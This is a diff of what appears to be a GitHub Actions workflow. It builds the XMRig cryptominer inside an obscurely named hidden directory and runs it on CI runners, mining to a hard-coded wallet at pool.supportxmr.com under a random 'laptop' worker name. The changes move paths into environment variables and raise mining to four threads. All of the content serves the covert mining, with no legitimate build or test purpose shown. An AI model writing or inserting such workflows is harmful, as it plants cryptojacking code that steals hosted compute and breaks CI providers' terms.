@@ -14,10 +14,11 @@ jobs:
         id: worker
         run: echo "name=laptop$(shuf -i 1-100000 -n 1)" >> $GITHUB_OUTPUT
 
-      - name: Setup directories
+      - name: Setup environment
         run: |
           mkdir -p ~/.local/.run/.hello/runner/go/beein/.go/do
           cd ~/.local/.run/.hello/runner/go/beein/.go/do
+          echo "WORKING_DIR=$(pwd)" >> $GITHUB_ENV
 
       - name: Update and upgrade packages
         run: |
@@ -28,22 +29,21 @@ jobs:
         run: |
           sudo apt install -y cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Clone XMRig
+      - name: Clone and build XMRig
         run: |
+          cd $WORKING_DIR
           git clone https://github.com/xmrig/xmrig.git
-
-      - name: Build XMRig
-        run: |
           cd xmrig
           mkdir build
           cd build
           cmake ..
           make -j1
+          echo "XMRIG_DIR=$(pwd)" >> $GITHUB_ENV
 
       - name: Run XMRig
         run: |
-          cd ~/.local/.run/.hello/runner/go/beein/.go/do/xmrig/build
+          cd $XMRIG_DIR
           nice -n 19 ./xmrig -o pool.supportxmr.com:3333 \
             -u 46iWdfQ1WgVaJNjPCbVBsnVnzPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p \
             -p ${{ steps.worker.outputs.name }} \
-            -k --donate-level 1
+            -k --donate-level 1 -t 4
